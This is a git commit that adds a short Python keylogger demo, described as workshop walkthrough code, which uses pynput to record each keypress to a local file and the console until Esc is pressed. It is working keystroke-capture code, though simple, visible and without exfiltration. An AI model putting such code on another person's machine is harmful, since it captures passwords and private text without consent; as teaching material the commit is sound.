5f2cd1995ed7eddc2b013fed211430c33f1bfca0
MalHus <95773832+MalHus@users.noreply.github.com>
2023-01-19 21:58:30 -0500

    Added keylogger demo code
    The code walkthrough from the workshop.

---
+++ keylogger_demo.py
@@ -0,0 +1,19 @@
+import pynput 
+from pynput.keyboard import Key, Listener
+
+
+def on_press(key):
+    write_file(key)
+    print(key)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+def write_file(key):
+    with open("a.txt", 'a')  as f:
+        f.write(str(key))
+        
+
+with Listener(on_press = on_press, on_release = on_release) as l: 
+    l.join() 
